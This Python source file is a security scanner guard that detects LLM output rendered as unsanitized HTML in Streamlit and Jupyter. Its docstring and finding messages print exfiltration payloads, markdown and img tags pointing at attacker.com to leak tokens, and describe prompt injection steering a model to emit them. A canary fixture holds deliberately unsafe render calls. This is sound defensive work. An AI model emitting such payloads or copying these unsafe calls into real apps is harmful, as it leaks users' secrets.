"""Guard: LLM output rendered as executable HTML or Markdown without sanitization (OWASP-LLM:LLM02).

When a model's response is rendered as HTML — either in a Streamlit app, a Jupyter notebook,
or a web view — an attacker who successfully injects into the model's context can include
markup that executes in the browser or triggers out-of-band HTTP requests.

The canonical exfiltration payload in markdown:

    Here is your answer: ![](https://attacker.com/collect?token=<secret>)

When rendered by a browser (or Streamlit's markdown parser with unsafe_allow_html), this
invisible image causes the browser to fetch the attacker-controlled URL — exfiltrating
cookies, JWTs, or secrets embedded in the query string. No user interaction required.

Three statically detectable rendering patterns:

  1. **`streamlit-unsafe-html`** (HIGH): `st.markdown(...)` called with `unsafe_allow_html=True`.
     Streamlit's default is `unsafe_allow_html=False`, which strips `<script>`, `<iframe>`, and
     `<img>` tags from rendered content. Setting the flag enables arbitrary HTML — combined with
     model output, this allows XSS and data exfiltration via crafted image/link markdown.

  2. **`ipython-html-display`** (MEDIUM): `IPython.display.HTML(...)` or `display(HTML(...))` is
     called. In Jupyter notebooks (including JupyterLab and nbconvert-rendered reports), the HTML
     argument is rendered directly in the browser. Model output passed to `HTML()` can contain
     exfiltration payloads that fire when the notebook is viewed or shared.

  3. **`streamlit-html-call`** (HIGH): `st.html(...)` is called. Unlike `st.markdown()`, this
     Streamlit API (added in 1.30) has no `unsafe_allow_html` opt-in at all — every call renders
     its argument as raw HTML unconditionally. There is no safe default to bypass, so a bare
     `st.html(model_output)` call is a stronger sink than the `st.markdown()` case above.

**Why these severities?**
  * HIGH for `streamlit-unsafe-html`: it requires an explicit opt-in flag that Streamlit
    specifically warns against; the most common rendering path in deployed LLM apps.
  * MEDIUM for `ipython-html-display`: notebooks are typically local or internal tools where
    the attacker surface is narrower, but the pattern is still actively exploitable when
    notebooks are shared or published.
  * HIGH for `streamlit-html-call`: same deployed-app, no-interaction, passive-render pattern as
    `streamlit-unsafe-html` — arguably higher confidence, since there is no safe-default case to
    rule out; every `st.html()` call renders raw HTML.

**Checklist item:** `3b-markdown-exfiltration` (partial — catches `st.markdown(unsafe_allow_html=True)`,
`st.html()`, and the Jupyter `HTML()` display sinks; custom in-house HTML renderers/template filters
are not detected — there is no fixed, enumerable API surface to regex against for those).

**Suppress:** `# security: allow-markdown-xss` in any file silences both checks repo-wide.
Use only when the rendered content is guaranteed to come from a trusted, validated source
(e.g., a static string or a value that has been passed through `bleach.clean()` with a
strict allowlist).
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    iter_files,
    pragma_present,
    python_scan_dirs,
    read,
    rel,
    strip_python_line_comment,
    strip_python_strings,
)

_PRAGMA = "security: allow-markdown-xss"

_STANDARDS = ["OWASP-LLM:LLM02"]

# st.markdown(..., unsafe_allow_html=True) — the flag that disables Streamlit's HTML escaping.
# Matches any keyword-argument ordering and optional spaces around the `=`.
_STREAMLIT_UNSAFE = re.compile(
    r"\bst\s*\.\s*markdown\s*\([^)]*unsafe_allow_html\s*=\s*True",
    re.IGNORECASE | re.DOTALL,
)

# IPython HTML display — renders content as raw HTML in the Jupyter output cell.
# Two canonical patterns only:
#   - IPython.display.HTML(...)  — fully-qualified call
#   - display(HTML(...))         — imported display + HTML pair
# The previously-used third alternative `HTML(...)` (standalone) was too broad:
# it matched argument strings like `help='Output as HTML(...)' ` in argparse
# and similar non-display usages. Only flag unambiguous IPython display calls.
_IPYTHON_HTML = re.compile(
    r"\bIPython\s*\.\s*display\s*\.\s*HTML\s*\("
    r"|\bdisplay\s*\(\s*HTML\s*\(",
    re.IGNORECASE,
)

# st.html(...) — Streamlit's dedicated raw-HTML render API (>=1.30). Unlike st.markdown(),
# there is no unsafe_allow_html opt-in to check for: every call renders its argument as raw
# HTML unconditionally, so the call site itself is the unsafe sink.
_STREAMLIT_HTML_CALL = re.compile(r"\bst\s*\.\s*html\s*\(", re.IGNORECASE)


class MarkdownRenderXssGuard(Guard):
    id = "markdown-render-xss"
    title = "LLM output rendered as executable HTML without sanitization"
    area = "AI agent"

    # streamlit_ui.py has two markdown-render-xss plants:
    #   st.markdown(answer, unsafe_allow_html=True) -> streamlit-unsafe-html
    #   st.html(answer)                              -> streamlit-html-call
    # Must NOT contain: allow-markdown-xss pragma — it silences the check repo-wide.
    canary_plant = CanaryPlant(
        files={
            "streamlit_ui.py": (
                "import streamlit as st\n"
                "\n"
                "\n"
                "def render_answer(answer: str) -> None:\n"
                "    st.markdown(answer, unsafe_allow_html=True)\n"
                "    st.html(answer)\n"
            ),
        },
        expects=frozenset({
            "markdown-render-xss/streamlit-unsafe-html",
            "markdown-render-xss/streamlit-html-call",
        }),
    )

    def applies(self, profile: StackProfile) -> bool:
        return "llm" in profile.features

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        files: list[tuple[Path, str]] = []
        seen: set[Path] = set()
        for d in python_scan_dirs(root, profile):
            for f in iter_files(d, (".py",)):
                if f in seen:
                    continue
                seen.add(f)
                files.append((f, read(f)))

        for _f, text in files:
            if pragma_present(_PRAGMA, text, dialect="python"):
                return []

        # Blank triple-quoted string/docstring content (line numbers preserved) before any
        # pattern search, so a code EXAMPLE inside a docstring (`"""Call st.html(answer) to
        # render it"""`) is not mistaken for a live call (review M6). Single-line string
        # literals are left intact — the same accepted trade-off `strip_python_strings`
        # documents for every other guard that uses it.
        stripped = [(f, strip_python_strings(text, filename=f)) for f, text in files]

        out: list[Finding] = []
        out += self._check_streamlit_unsafe(root, stripped)
        out += self._check_ipython_html(root, stripped)
        out += self._check_streamlit_html_call(root, stripped)
        return out

    def _check_streamlit_unsafe(
        self, root: Path, files: list[tuple[Path, str]]
    ) -> list[Finding]:
        out: list[Finding] = []
        for f, text in files:
            # Search the FULL text: black-formatted calls put unsafe_allow_html on its
            # own line, so a per-line search never sees the whole pattern. Each call in
            # a file fires (finditer); the lineno points at the st.markdown( line.
            #
            # Comments are stripped first. `_STREAMLIT_UNSAFE` spans newlines under DOTALL to
            # reach a wrapped call's kwargs, which also let it span straight into a `#` comment
            # INSIDE that call — so a deliberately commented-out `# unsafe_allow_html=True,`
            # fired a HIGH on code that has the flag turned off (#437 review).
            # `strip_python_line_comment` only truncates, so the line math below is unchanged.
            code = "\n".join(strip_python_line_comment(ln) for ln in text.split("\n"))
            for m in _STREAMLIT_UNSAFE.finditer(code):
                lineno = code[: m.start()].count("\n") + 1
                out.append(Finding(
                        check_id=self.id,
                        severity="high",
                        title="Streamlit markdown rendered with unsafe HTML enabled",
                        location=f"{rel(root, f)}:{lineno}",
                        message=(
                            "`st.markdown()` is called with `unsafe_allow_html=True`. "
                            "Streamlit's default strips HTML tags (including `<script>`, "
                            "`<img>`, and `<iframe>`) from rendered content. With the flag "
                            "set, model output can include markdown image references "
                            "(`![](https://attacker.com?data=secret)`) that trigger "
                            "out-of-band HTTP requests exfiltrating cookies, tokens, or "
                            "any value in the session when the page is rendered in a "
                            "browser."
                        ),
                        remediation=(
                            "Remove `unsafe_allow_html=True` — the default is safe and "
                            "strips dangerous tags before rendering. If you need to display "
                            "rich content from the model, first pass the response through "
                            "`bleach.clean(response, tags=ALLOWED_TAGS, strip=True)` with "
                            "a strict allowlist before calling `st.markdown()`. Suppress "
                            "with `# security: allow-markdown-xss` only after verifying "
                            "the rendered content cannot include model-generated HTML."
                        ),
                        rule="markdown-render-xss/streamlit-unsafe-html",
                        standards=list(_STANDARDS),
                    ))
        return out

    def _check_ipython_html(
        self, root: Path, files: list[tuple[Path, str]]
    ) -> list[Finding]:
        # One finding per display line, every file (#425, absorbing #586): returning the first
        # hit capped the rule at one finding repo-wide, unlike its two streamlit siblings.
        out: list[Finding] = []
        for f, text in files:
            for lineno, line in enumerate(text.splitlines(), 1):
                if _IPYTHON_HTML.search(line):
                    out.append(Finding(
                        check_id=self.id,
                        severity="medium",
                        title="IPython HTML display renders content as executable HTML",
                        location=f"{rel(root, f)}:{lineno}",
                        message=(
                            "`IPython.display.HTML()` or `display(HTML())` renders its "
                            "argument as raw HTML in the Jupyter output cell. When the "
                            "argument includes model output, an injected payload can "
                            "execute scripts, render invisible images, or add form "
                            "elements in the notebook — the attack fires when the "
                            "notebook is viewed, shared, or exported via nbconvert."
                        ),
                        remediation=(
                            "Avoid rendering model output as raw HTML. Use "
                            "`IPython.display.Markdown(response)` instead, which "
                            "sanitizes HTML tags. If HTML rendering is required, sanitize "
                            "with `bleach.clean(response, tags=ALLOWED_TAGS, strip=True)` "
                            "before passing to `HTML()`. Suppress with "
                            "`# security: allow-markdown-xss` only after confirming the "
                            "content source is trusted."
                        ),
                        rule="markdown-render-xss/ipython-html-display",
                        standards=list(_STANDARDS),
                    ))
        return out

    def _check_streamlit_html_call(
        self, root: Path, files: list[tuple[Path, str]]
    ) -> list[Finding]:
        out: list[Finding] = []
        for f, text in files:
            # Same full-text, comment-stripped search as _check_streamlit_unsafe so a
            # black-formatted multi-arg call (e.g. `st.html(\n    answer,\n)`) is still
            # caught and a `# st.html(...)` reference in a comment is not.
            code = "\n".join(strip_python_line_comment(ln) for ln in text.split("\n"))
            for m in _STREAMLIT_HTML_CALL.finditer(code):
                lineno = code[: m.start()].count("\n") + 1
                out.append(Finding(
                        check_id=self.id,
                        severity="high",
                        title="Streamlit st.html() renders content as raw HTML",
                        location=f"{rel(root, f)}:{lineno}",
                        message=(
                            "`st.html()` is called. Unlike `st.markdown()`, this Streamlit "
                            "API has no `unsafe_allow_html` opt-in — every call renders its "
                            "argument as raw HTML unconditionally. With model output, this "
                            "allows XSS and data exfiltration via crafted image/link markup "
                            "(`<img src=https://attacker.com?data=secret>`), firing when the "
                            "page is rendered in a browser with no user interaction required."
                        ),
                        remediation=(
                            "Avoid passing model output to `st.html()`. If you need to "
                            "display rich content from the model, use `st.markdown()` with "
                            "its safe default (no `unsafe_allow_html`), or first pass the "
                            "response through `bleach.clean(response, tags=ALLOWED_TAGS, "
                            "strip=True)` with a strict allowlist before rendering as HTML. "
                            "Suppress with `# security: allow-markdown-xss` only after "
                            "verifying the rendered content cannot include model-generated "
                            "HTML (e.g. it is a static, hardcoded string)."
                        ),
                        rule="markdown-render-xss/streamlit-html-call",
                        standards=list(_STANDARDS),
                    ))
        return out
